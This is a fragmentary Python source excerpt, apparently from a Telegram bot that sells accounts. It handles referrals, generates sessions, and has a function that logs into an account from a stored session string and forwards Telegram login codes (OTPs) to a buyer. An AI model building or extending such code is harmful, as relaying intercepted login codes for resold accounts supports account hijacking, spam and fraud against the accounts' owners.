...
class BotHandlers:
    def __init__(self, app: Client):
        ...
        _bot_instance = app
        self.app = app
        self.pending_sessions = {}  # For /gensession
                        ...
                        if success:
                            ...
                            try:
                                await client.send_message(
                                    referrer['user_id'],
                                    f"🎉 **New referral!**\nUser {user_id} used your link.\nTotal referrals: {await get_referral_count(referrer['user_id'])}"
                                )
                            except:
                                pass
        ...
        # ---------- PROTECT OTHER COMMANDS (only admins) ----------
        # All commands not explicitly allowed for non-admin are blocked by filters.user(ADMIN_ID)

# ---------- OTP FORWARDER (Standalone) ----------
async def forward_telegram_otp(account_id: int, buyer_id: int, session_string: str):
    """Logs into account and forwards OTP from 777000 to buyer."""
    ...
    try:
        async with Client(
            ...
            await asyncio.sleep(600)  # 10 min timeout
            await _bot_instance.send_message(
                buyer_id,
